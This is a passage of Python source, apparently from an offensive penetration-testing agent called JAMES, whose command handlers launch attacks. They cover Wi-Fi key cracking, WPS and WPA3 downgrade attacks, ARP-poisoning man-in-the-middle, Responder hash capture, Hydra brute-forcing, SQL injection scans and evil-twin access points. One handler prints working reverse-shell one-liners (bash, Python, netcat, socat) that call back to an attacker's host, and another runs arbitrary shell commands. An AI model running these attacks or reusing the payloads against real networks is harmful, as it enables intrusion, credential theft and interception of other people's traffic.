                if isinstance(param_val, str) and param_val.startswith("{{") and param_val.endswith("}}"):
                    var_name = param_val[2:-2].strip()
                    if var_name not in self.context:
                        missing.append(var_name)
        
        if missing:
            missing = list(set(missing))
            return (f"⚠️ Cannot start skill '{name}' because parameters are missing from context:\n"
                    f"  {', '.join(missing)}\n\n"
                    f"Please set them using: set <variable> <value>")
        
        # Launch the workflow in a separate thread so we don't block the agent

        t = threading.Thread(target=self._execute_skill_steps, args=(skill,), daemon=True)
        t.start()
        
        return f"⚡ Starting automated skill: {skill['name']}\n\nSwitch to the ⚡ Dashboard tab to monitor progress in the terminal."

    def _do_autopwn(self, m, raw) -> str:
        iface = m.group(1) if m.group(1) else self.context.get("interface")
        if not iface:
            return "[!] No interface specified. Use: autopwn <interface>\n    Or set one first: set interface wlan0"
        wordlist = self.context.get("wordlist", "/home/malcolm/Desktop/rockyou.txt")
        self.context["interface"] = iface


        t = threading.Thread(
            target=self.orch.auto_wifi_pwn,
            args=(iface, wordlist),
            daemon=True
        )
        t.start()

        return (f"🔥 AutoPwn launched on {iface}\n"
                f"   Wordlist: {wordlist}\n\n"
                f"   The workflow is running in the background.\n"
                f"   Switch to the ⚡ Dashboard tab to watch progress in real-time.\n\n"
                f"   💡 To change the wordlist: set wordlist /path/to/wordlist.txt")

    def _execute_skill_steps(self, skill: dict):
        self.orch.execute_skill_steps(skill, self.context)

    def _do_show_log(self, m, raw) -> str:
        log = self.orch.export_log()
        if not log:
            return "📋 No tasks in log yet."
        lines = [f"📋 Task Log ({len(log)} entries):\n"]
        for entry in log[-15:]:  # last 15
            icon = "✅" if entry["status"] == "done" else "❌"
            lines.append(f"  {icon} [{entry['timestamp'][:19]}] {entry['action']} ({entry['tool']})")
        return "\n".join(lines)

    def _do_shell(self, m, raw) -> str:
        cmd = m.group(1).strip()
        result = self.orch.layer.run(cmd, timeout=60)
        output = (result.stdout + result.stderr).strip()
        if len(output) > 3000:
            output = output[:3000] + "\n... (truncated)"
        return f"$ {cmd}\n{output}" if output else f"$ {cmd}\n(no output)"

    # ── new handlers ────────────────────────────────────────────

    def _do_masscan(self, m, raw) -> str:
        target = m.group(1).strip()
        self.context["target"] = target
        result = self.orch.masscan.scan(target, rate=1000)
        if "error" in result:
            return f"[!] Masscan failed: {result['error']}"
        count = result.get("count", 0)
        lines = [f"⚡ Masscan — {target} ({count} open ports)\n"]
        for h in result.get("hosts", [])[:50]:
            lines.append(f"  {h['ip']}:{h['port']}/{h['proto']}  {h['status']}")
        if count > 50:
            lines.append(f"\n  ... and {count - 50} more")
        return "\n".join(lines)

    def _do_osint(self, m, raw) -> str:
        domain = m.group(1).strip()
        self.context["domain"] = domain
        self.context["target"] = domain
        result = self.orch.harvester.harvest(domain)
        lines = [f"🔎 OSINT — {domain}\n"]
        lines.append(f"  📧 Emails found: {result['email_count']}")
        for e in result.get("emails", [])[:15]:
            lines.append(f"    • {e}")
        lines.append(f"\n  🌐 Subdomains found: {result['subdomain_count']}")
        for s in result.get("subdomains", [])[:15]:
            lines.append(f"    • {s}")
        if result.get("ips"):
            lines.append(f"\n  🔢 IPs found: {len(result['ips'])}")
            for ip in result["ips"][:10]:
                lines.append(f"    • {ip}")
        return "\n".join(lines)

    def _do_whois(self, m, raw) -> str:
        domain = m.group(1).strip()
        result = self.orch.layer.run(f"whois {domain} | head -40", timeout=15)
        return f"📋 WHOIS — {domain}\n\n{result.stdout[:2000]}"

    def _do_dns_enum(self, m, raw) -> str:
        domain = m.group(1).strip()
        cmd = f"dig {domain} ANY +noall +answer && dig {domain} MX +noall +answer && dig {domain} NS +noall +answer"
        result = self.orch.layer.run(cmd, timeout=15)
        return f"🔍 DNS — {domain}\n\n{result.stdout[:2000]}"

    def _do_waf_detect(self, m, raw) -> str:
        url = m.group(1).strip()
        result = self.orch.wafdetect.detect(url)
        if result["waf_detected"]:
            return f"🛡️ WAF Detected on {url}\n\n  Vendor: {result['waf_name']}"
        return f"✅ No WAF detected on {url}"

    def _do_ssl_scan(self, m, raw) -> str:
        target = m.group(1).strip()
        result = self.orch.sslscan.scan(target)
        lines = [f"🔐 SSL/TLS Scan — {target}\n"]
        lines.append(f"  Ciphers found: {result['ciphers_found']}")
        if result.get("vulnerabilities"):
            lines.append(f"\n  ⚠️ Vulnerabilities:")
            for v in result["vulnerabilities"]:
                lines.append(f"    ✕ {v}")
        else:
            lines.append("  ✅ No critical vulnerabilities found")
        return "\n".join(lines)

    def _do_web_scan(self, m, raw) -> str:
        url = m.group(1).strip()
        self.context["target_url"] = url
        result = self.orch.nikto_scan(url)
        vulns = result.get("vulnerabilities", [])
        lines = [f"🌐 Nikto Scan — {url}", f"{len(vulns)} finding(s)", ""]
        if result.get("server_info"):
            lines.append(f"  Server: {result['server_info']}")
        for v in vulns[:20]:
            lines.append(f"  ⚠ {v}")
        return "\n".join(lines)

    def _do_dir_brute(self, m, raw) -> str:
        url = m.group(1).strip()
        self.context["target_url"] = url
        result = self.orch.dir_bust(url)
        if result.get("findings"):
            lines = [f"📂 Directory Scan — {url}", f"Found {result['total']} path(s):", ""]
            for f in result["findings"][:20]:
                lines.append(f"  [{f['status']}] {f['path']}  ({f['size']}B)")
            return "\n".join(lines)
        return f"📂 Directory Scan — {url}\n\nNo paths found."

    def _do_sqli(self, m, raw) -> str:
        url = m.group(1).strip()
        self.context["target_url"] = url
        result = self.orch.sqli_scan(url)
        if result.get("injectable"):
            lines = [f"💉 SQLMap — {url}", f"⚠ INJECTABLE! {result['vuln_count']} vuln(s) found:", ""]
            for v in result.get("vulnerabilities", [])[:10]:
                lines.append(f"  {v}")
            return "\n".join(lines)
        return f"💉 SQLMap — {url}\n\nNot injectable (or WAF blocking)."

    def _do_mitm(self, m, raw) -> str:
        victim = m.group(1).strip()
        gateway = m.group(2).strip() if m.group(2) else self.context.get("gateway")
        iface = self.context.get("interface")
        if not gateway:
            return "[!] Need gateway. Use: mitm <victim> <gateway>\n    Or: set gateway 192.168.1.1"
        if not iface:
            return "[!] No interface set. Use: set interface eth0"
        self.context["victim"] = victim
        self.context["gateway"] = gateway


        t = threading.Thread(
            target=self.orch.ettercap.arp_poison,
            args=(iface, victim, gateway),
            kwargs={"timeout": 60},
            daemon=True
        )
        t.start()
        return (f"🕸️ MITM Attack Started\n"
                f"  Victim:  {victim}\n"
                f"  Gateway: {gateway}\n"
                f"  Via:     {iface}\n\n"
                f"  ARP poisoning active for 60s. Check Dashboard for output.")

    def _do_responder(self, m, raw) -> str:
        iface = m.group(1) if m.group(1) else self.context.get("interface")
        if not iface:
            return "[!] No interface specified. Use: responder <interface>"


        t = threading.Thread(
            target=self.orch.responder.start,
            args=(iface,),
            kwargs={"timeout": 60},
            daemon=True
        )
        t.start()
        return (f"🎣 Responder launched on {iface}\n"
                f"  Poisoning LLMNR/NBT-NS/MDNS for 60s\n"
                f"  Captured hashes will appear in Dashboard terminal.")

    def _do_sniff(self, m, raw) -> str:
        iface = m.group(1) if m.group(1) else self.context.get("interface")
        if not iface:
            return "[!] No interface specified. Use: sniff <interface>"
        result = self.orch.layer.run(f"timeout 15 tcpdump -i {iface} -c 100 -nn 2>/dev/null", sudo=True, timeout=20)
        return f"📡 Packet Capture — {iface} (100 packets)\n\n{result.stdout[:2500]}"

    def _do_brute(self, m, raw) -> str:
        target = m.group(1).strip()
        proto = m.group(2).strip() if m.group(2) else "ssh"
        username = self.context.get("username", "admin")
        self.context["target"] = target
        result = self.orch.brute_service(target, proto, username=username)
        if result.get("found"):
            lines = [f"🔑 Hydra — Credentials FOUND for {target} ({proto})!", ""]
            for cred in result["credentials"]:
                lines.append(f"  Login: {cred['login']}  Password: {cred['password']}")
            return "\n".join(lines)
        return f"🔒 Hydra — no credentials found for {username}@{target} ({proto})"

    def _do_arp_discover(self, m, raw) -> str:
        iface = m.group(1).strip() if m.group(1) else ""
        result = self.orch.arp_discover(interface=iface)
        hosts = result.get("hosts", [])
        if hosts:
            lines = [f"🔍 ARP Discovery — {len(hosts)} host(s) found", ""]
            lines.append(f"{'IP':16s}  {'MAC':18s}  Vendor")
            lines.append("─" * 60)
            for h in hosts[:25]:
                lines.append(f"  {h['ip']:16s}  {h['mac']:18s}  {h['vendor']}")
            return "\n".join(lines)
        return "🔍 ARP Discovery — no hosts found on this network."

    def _do_nikto_scan(self, m, raw) -> str:
        target = m.group(1).strip()
        self.context["target"] = target
        result = self.orch.nikto_scan(target)
        vulns = result.get("vulnerabilities", [])
        lines = [f"🌐 Nikto Scan — {target}", f"{len(vulns)} finding(s)", ""]
        if result.get("server_info"):
            lines.append(f"  Server: {result['server_info']}")
        for v in vulns[:20]:
            lines.append(f"  ⚠ {v}")
        return "\n".join(lines)

    def _do_smb_enum(self, m, raw) -> str:
        target = m.group(1).strip()
        self.context["target"] = target
        result = self.orch.smb_enum(target)
        lines = [f"📂 SMB Enumeration — {target}",
                 f"{result.get('share_count', 0)} share(s), {result.get('user_count', 0)} user(s)", ""]
        if result.get("os_info"):
            lines.append(f"  OS: {result['os_info']}")
        for s in result.get("shares", []):
            lines.append(f"  📂 {s['name']} ({s['type']})")
        for u in result.get("users", [])[:10]:
            lines.append(f"  👤 {u}")
        return "\n".join(lines)

    def _do_dns_lookup(self, m, raw) -> str:
        domain = m.group(1).strip()
        rtype = m.group(2).strip() if m.lastindex and m.lastindex >= 2 and m.group(2) else "ANY"
        result = self.orch.dns_lookup(domain, record_type=rtype)
        records = result.get("records", [])
        lines = [f"🔎 DNS Lookup — {domain} ({rtype})", f"{len(records)} record(s)", ""]
        for r in records[:20]:
            lines.append(f"  → {r}")
        return "\n".join(lines)

    def _do_reverse_shell(self, m, raw) -> str:
        port = m.group(1) if m.group(1) else "4444"
        lhost = self.context.get("lhost", "0.0.0.0")
        self.context["lport"] = port
        return (f"🐚 Reverse Shell Payloads (LHOST={lhost} LPORT={port})\n\n"
                f"  [Bash]\n"
                f"    bash -i >& /dev/tcp/{lhost}/{port} 0>&1\n\n"
                f"  [Python]\n"
                f"    python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n\n"
                f"  [Netcat]\n"
                f"    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {port} >/tmp/f\n\n"
                f"  [Socat]\n"
                f"    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{port}\n\n"
                f"  💡 Start listener: ! nc -nlvp {port}\n"
                f"  💡 Set your IP: set lhost <your-ip>")

    def _do_msf(self, m, raw) -> str:
        query = m.group(1) if m.group(1) else ""
        if query:
            result = self.orch.layer.run(f"msfconsole -q -x 'search {query}; exit'", timeout=45)
            return f"🔫 Metasploit Search: {query}\n\n{result.stdout[-2500:]}"
        return ("🔫 Metasploit usage:\n"
                "  msf <search term>    Search for exploits\n"
                "  ! msfconsole         Launch interactive console\n"
                "  run skill msf_exploit Run automated MSF skill")

    def _do_report(self, m, raw) -> str:
        from james.core.report import generate_html_report, save_report

        log = self.orch.export_log()
        skills = self.orch.list_skills()
        tool_status = self.orch.system_check()
        loot = self.orch.get_loot_summary()
        installed = sum(1 for v in tool_status.values() if v)

        # Collect known targets from GUI if available, otherwise from context
        targets = set()
        if hasattr(self, '_gui_known_targets'):
            targets = self._gui_known_targets
        elif self.context.get("target"):
            targets.add(self.context["target"])

        html = generate_html_report(
            task_log=log,
            context=self.context,
            loot_summary=loot,
            tool_status=tool_status,
            skills=skills,
            known_targets=targets,
        )

        report_path = save_report(html)

        # Also save a quick markdown summary alongside it
        md_path = report_path.with_suffix(".md")
        md_lines = [f"# JAMES Penetration Test Report",
                     f"Generated: {report_path.stem.split('_', 1)[-1]}",
                     f"",
                     f"## Summary",
                     f"- Tasks: {len(log)}",
                     f"- Keys cracked: {loot.get('cracked_count', 0)}",
                     f"- Targets found: {len(targets)}",
                     f"- Tools: {installed}/{len(tool_status)} installed",
                     f"- Skills: {len(skills)} available",
                     f"",
                     f"Full report: {report_path}"]
        md_path.write_text("\n".join(md_lines))

        return (f"📋 Report generated ({len(log)} tasks logged)\n"
                f"   📄 HTML: {report_path}\n"
                f"   📝 Summary: {md_path}\n\n"
                f"   🔑 Keys cracked: {loot.get('cracked_count', 0)}\n"
                f"   🎯 Targets found: {len(targets)}\n"
                f"   ⚙️  Tools: {installed}/{len(tool_status)} installed\n"
                f"   ⚡ Skills: {len(skills)} available")

    def _do_show_loot(self, m, raw) -> str:
        loot = self.orch.get_loot_summary()
        if loot["cracked_count"] == 0:
            return "🔑 No cracked keys in the loot cache yet.\nRun a wifi blitz or crack to populate."
        lines = [f"🔑 Cracked Keys ({loot['cracked_count']}):"]
        for entry in loot["keys"]:
            lines.append(f"  • {entry['essid'] or entry['id']}: {entry['key']}  [{entry['method']}]  ({entry['when'][:10]})")
        return "\n".join(lines)

    def _do_remote_access(self, m, raw) -> str:
        """Enable SSH + remote access on this machine."""
        import subprocess
        from james.remote.server import get_local_ip

        ip = get_local_ip()
        lines = ["🌐 Configuring remote access...\n"]

        # 1. Enable SSH
        try:
            r = subprocess.run(
                ["sudo", "-n", "systemctl", "enable", "--now", "ssh"],
                capture_output=True, text=True, timeout=10
            )
            if r.returncode == 0:
                lines.append("  ✅ SSH service enabled and running")
            else:
                # Try installing
                subprocess.run(
                    ["sudo", "-n", "apt-get", "install", "-y", "openssh-server"],
                    capture_output=True, timeout=60
                )
                subprocess.run(
                    ["sudo", "-n", "systemctl", "enable", "--now", "ssh"],
                    capture_output=True, timeout=10
                )
                lines.append("  ✅ SSH installed and enabled")
        except Exception as e:
            lines.append(f"  ⚠ SSH setup issue: {e}")

        # 2. Open firewall ports
        for port, label in [(22, "SSH"), (1337, "JAMES Remote"), (5900, "VNC"), (6080, "noVNC")]:
            try:
                subprocess.run(
                    ["sudo", "-n", "ufw", "allow", str(port)],
                    capture_output=True, timeout=5
                )
            except Exception:
                pass
            try:
                subprocess.run(
                    ["sudo", "-n", "iptables", "-I", "INPUT", "-p", "tcp",
                     "--dport", str(port), "-j", "ACCEPT"],
                    capture_output=True, timeout=5
                )
            except Exception:
                pass
            lines.append(f"  ✅ Port {port} ({label}) opened")

        # 3. Enable xrdp if available (graphical remote)
        try:
            r = subprocess.run(
                ["sudo", "-n", "systemctl", "enable", "--now", "xrdp"],
                capture_output=True, timeout=10
            )
            if r.returncode == 0:
                lines.append("  ✅ xRDP enabled (port 3389 — use Remote Desktop)")
                try:
                    subprocess.run(
                        ["sudo", "-n", "ufw", "allow", "3389"],
                        capture_output=True, timeout=5
                    )
                    subprocess.run(
                        ["sudo", "-n", "iptables", "-I", "INPUT", "-p", "tcp",
                         "--dport", "3389", "-j", "ACCEPT"],
                        capture_output=True, timeout=5
                    )
                except Exception:
                    pass
        except Exception:
            lines.append("  ⓘ xRDP not installed (install with: sudo apt install xrdp)")

        lines.append("")
        lines.append("  ══════════════════════════════════════")
        lines.append(f"  SSH:          ssh malcolm@{ip}")
        lines.append(f"  JAMES Remote: http://{ip}:1337  (text commands)")
        lines.append(f"  GUI Remote:   http://{ip}:6080  (full desktop)")
        lines.append(f"  RDP:          {ip}:3389 (if xrdp installed)")
        lines.append("  ══════════════════════════════════════")
        lines.append("")
        lines.append("  💡 Click 🌐 REMOTE for text-based web control.")
        lines.append("  💡 Click 🖥️ GUI REMOTE for full desktop in browser.")
        return "\n".join(lines)

    def _do_scan_aps(self, m, raw) -> str:
        iface = m.group(1) if m.lastindex and m.group(1) else self.context.get("monitor_interface") or self.context.get("interface")
        if not iface:
            return "[!] No interface specified. Use: scan aps wlan0\n    Or set one first: list interfaces"
        self.context["interface"] = iface.replace("mon", "") if iface.endswith("mon") else iface
        result = self.orch.scan_nearby_aps(iface)
        aps = result.get("aps", [])
        if not aps:
            return (f"📡 No access points found near {iface}.\n"
                    f"  Possible causes:\n"
                    f"  • No Wi-Fi adapter connected or not supported\n"
                    f"  • Adapter may not support monitor mode\n"
                    f"  • Try a longer scan: the default is 10 seconds")
        lines = [f"📡 Found {len(aps)} access points:"]
        lines.append(f"{'BSSID':<20} {'ESSID':<25} {'CH':>3} {'PWR':>5}  {'ENC'}")
        lines.append("─" * 70)
        for ap in aps[:20]:
            pwr = ap.get('power', -100)
            bars = "█" * max(0, min(5, (pwr + 100) // 15))
            lines.append(f"{ap.get('bssid',''):<20} {ap.get('essid',''):<25} {ap.get('channel',''):>3} {pwr:>4}  {ap.get('privacy','')}  {bars}")
        if len(aps) > 20:
            lines.append(f"  ... and {len(aps) - 20} more")
        return "\n".join(lines)

    # ── Wireless protocol handlers ──────────────────────────────

    def _do_wash_scan(self, m, raw) -> str:
        """Scan for WPS-enabled access points using wash."""
        iface = m.group(1) if m.lastindex and m.group(1) else self.context.get("monitor_interface") or self.context.get("interface")
        if not iface:
            return "[!] No interface. Use: wash wlan0mon\n    Enable monitor mode first."
        result = self.orch.reaver.wash_scan(iface)
        aps = result.get("aps", [])
        if not aps:
            return f"📡 No WPS-enabled APs found on {iface}.\n  Make sure you're in monitor mode."
        lines = [f"📡 WPS Access Points ({len(aps)}):"]
        lines.append(f"{'BSSID':<20} {'ESSID':<22} {'CH':>3} {'RSSI':>5} {'VER':>4} {'LOCKED'}")
        lines.append("─" * 72)
        for ap in aps:
            lock = "🔒 YES" if ap.get("wps_locked") else "🔓 NO"
            lines.append(
                f"{ap['bssid']:<20} {ap.get('essid',''):<22} {ap.get('channel',''):>3} "
                f"{ap.get('rssi',''):>5} {ap.get('wps_version',''):>4} {lock}"
            )
        lines.append("")
        lines.append("💡 Attack unlocked APs with: wps brute <BSSID> <channel>")
        lines.append("   Or try Pixie Dust: run skill wps_pixie")
        return "\n".join(lines)

    def _do_wep_attack(self, m, raw) -> str:
        """WEP attack chain: fake auth → ARP replay → crack."""
        bssid = m.group(1)
        iface = m.group(2) if m.lastindex and m.lastindex >= 2 and m.group(2) else self.context.get("monitor_interface") or self.context.get("interface")
        if not iface:
            return "[!] Need an interface. Use: wep attack <BSSID> <iface>\n    Enable monitor first."

        lines = ["⚡ WEP Attack Chain", f"  Target: {bssid}", f"  Interface: {iface}", ""]

        # Step 1: Fake auth
        lines.append("  [1/3] Fake authentication...")
        try:
            self.orch.aircrack.fake_auth(iface, bssid)
            lines.append("        ✅ Associated")
        except Exception as e:
            lines.append(f"        ⚠ Auth issue: {e}")

        # Step 2: ARP replay (short burst to collect IVs)
        lines.append("  [2/3] ARP replay (collecting IVs, 60s)...")
        try:
            self.orch.aircrack.arp_replay(iface, bssid, timeout=60)
            lines.append("        ✅ IV collection complete")
        except Exception:
            lines.append("        ⚠ ARP replay timeout (may need more time)")

        # Step 3: Crack
        lines.append("  [3/3] Cracking WEP key...")
        import glob
        caps = glob.glob("/tmp/*wep*.cap") + glob.glob("/tmp/*.cap")
        if caps:
            result = self.orch.aircrack.crack_wep(caps[-1], bssid=bssid)
            if result.get("found"):
                key = result["key"]
                lines.append(f"        🔑 KEY FOUND: {key}")
                self.orch.save_cracked_key(bssid, key, method="WEP")
            else:
                lines.append("        ❌ Not enough IVs yet. Run longer or try chopchop.")
        else:
            lines.append("        ❌ No capture file found. Start airodump first.")

        return "\n".join(lines)

    def _do_wps_brute(self, m, raw) -> str:
        """Full WPS PIN brute-force against a target BSSID."""
        bssid = m.group(1)
        channel = int(m.group(2)) if m.lastindex and m.lastindex >= 2 and m.group(2) else 0
        iface = self.context.get("monitor_interface") or self.context.get("interface")
        if not iface:
            return "[!] No interface set. Enable monitor mode first."
        if not channel:
            return f"[!] Need channel. Use: wps brute {bssid} <channel>"

        lines = [f"🔓 WPS PIN Brute-Force", f"  Target: {bssid} (ch {channel})", f"  Interface: {iface}", ""]

        # Try Pixie Dust first (fast)
        lines.append("  [1/2] Trying Pixie Dust (fast)...")
        result = self.orch.reaver.pixie_dust(iface, bssid, channel=channel)
        if result.get("success"):
            lines.append(f"        🔑 PIN: {result['pin']}")
            if result.get("wpa_psk"):
                lines.append(f"        🔑 PSK: {result['wpa_psk']}")
                self.orch.save_cracked_key(bssid, result["wpa_psk"], method="WPS-Pixie")
            return "\n".join(lines)

        lines.append("        ❌ Pixie Dust failed — falling back to brute-force")
        lines.append("  [2/2] Full PIN brute (this takes hours)...")
        result = self.orch.reaver.brute_force(iface, bssid, channel=channel, timeout=600)
        if result.get("success"):
            lines.append(f"        🔑 PIN: {result['pin']}")
            if result.get("wpa_psk"):
                lines.append(f"        🔑 PSK: {result['wpa_psk']}")
                self.orch.save_cracked_key(bssid, result["wpa_psk"], method="WPS-Brute")
        else:
            prog = result.get("progress", "")
            lines.append(f"        ⏳ Partial progress: {prog}")
            lines.append("        Run again to resume — reaver saves state.")

        return "\n".join(lines)

    def _do_wpa3_check(self, m, raw) -> str:
        """Check if a target AP supports WPA3/SAE."""
        bssid = m.group(1)
        iface = m.group(2) if m.lastindex and m.lastindex >= 2 and m.group(2) else self.context.get("interface")
        if not iface:
            return "[!] Need an interface. Use: wpa3 check <BSSID> <iface>"

        result = self.orch.wpa3.check_sae_support(iface, bssid)
        lines = [f"🔐 WPA3/SAE Check — {bssid}", ""]
        lines.append(f"  SAE (WPA3):      {'✅ YES' if result['supports_sae'] else '❌ NO'}")
        lines.append(f"  OWE (Open+Enc):  {'✅ YES' if result['supports_owe'] else '❌ NO'}")
        lines.append(f"  Transition Mode: {'⚠️ YES (exploitable!)' if result['transition_mode'] else '❌ NO'}")
        lines.append("")
        if result['transition_mode']:
            lines.append("  💡 Transition mode detected! Try: wpa3 downgrade " + bssid)
        elif result['supports_sae']:
            lines.append("  ⚠ Pure WPA3 — limited attack surface.")
            lines.append("  💡 Try SAE timing probe for side-channel: sae timing " + bssid)
        else:
            lines.append("  💡 Standard WPA2 — use handshake capture + crack.")
        return "\n".join(lines)

    def _do_wpa3_downgrade(self, m, raw) -> str:
        """WPA3 transition mode downgrade attack."""
        bssid = m.group(1)
        channel = int(m.group(2)) if m.lastindex and m.lastindex >= 2 and m.group(2) else 0
        iface = self.context.get("monitor_interface") or self.context.get("interface")
        if not iface:
            return "[!] No interface. Enable monitor mode first."
        if not channel:
            return f"[!] Need channel. Use: wpa3 downgrade {bssid} <channel>"

        lines = [f"🐉 WPA3 Downgrade Attack (Dragonblood)", f"  Target: {bssid} (ch {channel})", ""]
        result = self.orch.wpa3.downgrade_attack(iface, bssid, channel=channel)
        for log in result.get("log", []):
            lines.append(f"  → {log}")
        if result.get("success"):
            lines.append("")
            lines.append(f"  🔑 Handshake captured! File: {result['capture_file']}")
            lines.append(f"  💡 Crack with: crack wpa {result['capture_file']}")
        else:
            lines.append("  ❌ No WPA2 fallback handshake captured.")
            lines.append("  💡 Try again with more deauths or check if transition mode is active.")
        return "\n".join(lines)

    def _do_iot_scan(self, m, raw) -> str:
        """IoT device scan — banner grab + protocol detection."""
        target = m.group(1)
        self.context["target"] = target
        result = self.orch.iot.banner_grab(target)
        services = result.get("services", [])
        lines = [f"🏠 IoT Scan — {target}", f"  {len(services)} service(s) found:", ""]
        for svc in services:
            lines.append(f"  → {svc}")
        if not services:
            lines.append("  No open IoT ports found.")
        else:
            lines.append("")
            # Suggest protocol-specific follow-ups
            output = result.get("output", "")
            if "1883" in output or "mqtt" in output.lower():
                lines.append("  💡 MQTT detected! Try: mqtt scan " + target)
            if "5683" in output or "coap" in output.lower():
                lines.append("  💡 CoAP detected! Manual probe: coap-client coap://" + target)
            if "80" in output or "8080" in output:
                lines.append("  💡 Web interface found! Try: web pwn " + target)
            if "23" in output or "telnet" in output.lower():
                lines.append("  ⚠ Telnet open — try default creds: brute " + target + " telnet")
        return "\n".join(lines)

    def _do_ble_scan(self, m, raw) -> str:
        """Scan for Bluetooth Low Energy devices."""
        result = self.orch.iot.scan_ble()
        devices = result.get("devices", [])
        if not devices:
            return "📶 No BLE devices found.\n  Make sure Bluetooth adapter is available."
        lines = [f"📶 BLE Devices ({len(devices)}):"]
        lines.append(f"{'MAC':<20} {'Name'}")
        lines.append("─" * 50)
        for d in devices[:30]:
            lines.append(f"  {d['mac']:<20} {d['name']}")
        return "\n".join(lines)

    def _do_mqtt_scan(self, m, raw) -> str:
        """Probe an MQTT broker for open access."""
        target = m.group(1)
        self.context["target"] = target
        result = self.orch.iot.scan_mqtt(target)
        if result.get("open"):
            lines = [f"📡 MQTT Broker — {target}:1883", "  ⚠ OPEN (no auth required!)", ""]
            msgs = result.get("messages", [])
            if msgs:
                lines.append(f"  Captured {len(msgs)} message(s):")
                for msg in msgs[:10]:
                    lines.append(f"    → {msg[:100]}")
            lines.append("")
            lines.append("  💡 This broker has no authentication!")
            lines.append("  💡 Subscribe to all: mosquitto_sub -h " + target + " -t '#'")
            lines.append("  💡 Publish test: mosquitto_pub -h " + target + " -t test -m 'hello'")
            return "\n".join(lines)
        return f"📡 MQTT — {target}:1883\n  ❌ Broker not accessible or requires authentication."

    def _do_kill_james(self, m, raw) -> str:
        summary = self.orch.kill_james()
        killed = len(summary.get('killed', []))
        restored = len(summary.get('interfaces_restored', []))
        errors = summary.get('errors', [])

        lines = [
            "🛑 KILL JAMES — Complete",
            "",
            f"  Processes killed:    {killed}",
            f"  Interfaces restored: {restored}",
        ]
        if summary.get('killed'):
            lines.append(f"  Stopped: {', '.join(summary['killed'])}")
        if errors:
            lines.append(f"\n  ⚠️ Errors: {'; '.join(errors)}")
        lines.append("")
        lines.append("  ✅ All tools stopped, interfaces restored.")
        lines.append("  🌐 NetworkManager restarted — Wi-Fi should reconnect.")
        lines.append("  💡 If Wi-Fi doesn't reconnect, click the network icon in the tray.")
        return "\n".join(lines)

    def _do_clear(self, m, raw) -> str:
        self.context.clear()
        self.history.clear()
        # Remove persisted context file
        try:
            self.CONTEXT_FILE.unlink(missing_ok=True)
        except Exception:
            pass
        return "🔄 Session context and history cleared."

    def _do_capture(self, m, raw) -> str:
        iface = m.group(1) if m.group(1) else self.context.get("monitor_interface")
        if not iface:
            return "[!] No interface specified."
        result = self.orch.layer.run(
            f"timeout 30 airodump-ng {iface} --output-format csv -w /tmp/james_capture",
            sudo=True, timeout=35
        )
        return f"📡 Capture on {iface} complete.\n  Output: /tmp/james_capture-01.csv"

    # ── one-click hack handlers ─────────────────────────────────

    def _do_oneclick_wifi_blitz(self, m, raw) -> str:
        iface = m.group(1) if m.group(1) else self.context.get("interface")
        if not iface:
            return "[!] No interface specified. Use: wifi blitz <interface>\n    Or: set interface wlan0"
        wordlist = self.context.get("wordlist", "/home/malcolm/Desktop/rockyou.txt")
        self.context["interface"] = iface


        t = threading.Thread(
            target=self.orch.oneclick_wifi_blitz,
            args=(iface, wordlist),
            daemon=True
        )
        t.start()

        return (f"🔥 Wi-Fi Blitz launched on {iface}\n\n"
                f"   Multi-vector attack: PMKID → Handshake → WPS Pixie Dust\n"
                f"   Wordlist: {wordlist}\n\n"
                f"   Switch to ⚡ Dashboard to watch real-time progress.\n\n"
                f"   💡 To change wordlist: set wordlist /path/to/file.txt")

    def _do_oneclick_network_dominate(self, m, raw) -> str:
        target = m.group(1).strip()
        self.context["target"] = target


        t = threading.Thread(
            target=self.orch.oneclick_network_dominate,
            args=(target,),
            daemon=True
        )
        t.start()

        return (f"💀 Network Dominate launched → {target}\n\n"
                f"   Discovery → Fingerprint → Brute-force → Vuln analysis\n\n"
                f"   Switch to ⚡ Dashboard to watch real-time progress.")

    def _do_oneclick_web_pwn(self, m, raw) -> str:
        url = m.group(1).strip()
        self.context["target_url"] = url
        self.context["target"] = url


        t = threading.Thread(
            target=self.orch.oneclick_web_pwn,
            args=(url,),
            daemon=True
        )
        t.start()

        return (f"🌐 Web Pwn launched → {url}\n\n"
                f"   WAF detect → Directory brute → SQLi → SSL audit → Nikto\n\n"
                f"   Switch to ⚡ Dashboard to watch real-time progress.")

    def _do_oneclick_stealth_recon(self, m, raw) -> str:
        target = m.group(1).strip()
        self.context["target"] = target
        self.context["domain"] = target


        t = threading.Thread(
            target=self.orch.oneclick_stealth_recon,
            args=(target,),
            daemon=True
        )
        t.start()

        return (f"👁️ Stealth Recon launched → {target}\n\n"
                f"   OSINT → DNS → WHOIS → Passive scan → SSL cert\n"
                f"   No active exploitation — safe for pre-engagement.\n\n"
                f"   Switch to ⚡ Dashboard to watch real-time progress.")

    def _do_oneclick_evil_twin(self, m, raw) -> str:
        iface = m.group(1) if m.group(1) else self.context.get("interface")
        bssid = self.context.get("target_bssid")
        ssid = self.context.get("target_ssid")
        channel = self.context.get("target_channel")

        if not all([iface, bssid, ssid, channel]):
            missing = []
            if not iface: missing.append("interface")
            if not bssid: missing.append("target_bssid")
            if not ssid: missing.append("target_ssid")
            if not channel: missing.append("target_channel")
            return (f"[!] Missing context for Evil Twin: {', '.join(missing)}\n\n"
                    f"   Set them first:\n"
                    f"     set interface wlan0\n"
                    f"     set target_bssid AA:BB:CC:DD:EE:FF\n"
                    f"     set target_ssid NetworkName\n"
                    f"     set target_channel 6")

        t = threading.Thread(
            target=self.orch.oneclick_evil_twin,
            args=(iface, bssid, ssid, int(channel)),
            daemon=True
        )
        t.start()

        return (f"👿 Evil Twin launched!\n\n"
                f"   Cloning: {ssid} ({bssid}) on channel {channel}\n"
                f"   Interface: {iface}\n\n"
                f"   Switch to ⚡ Dashboard to watch real-time progress.")

    def _do_connect_open_wifi(self, m, raw) -> str:
        t = threading.Thread(
            target=self.orch.connect_open_wifi,
            daemon=True
        )
        t.start()

        return (f"🌐 Open Wi-Fi Auto-Connect launched!\n\n"
                f"   Scanning for unpassworded access points...\n"
                f"   The strongest network will be automatically connected to.\n\n"
                f"   Switch to ⚡ Dashboard to watch real-time progress.")

    # ── helpers ─────────────────────────────────────────────────

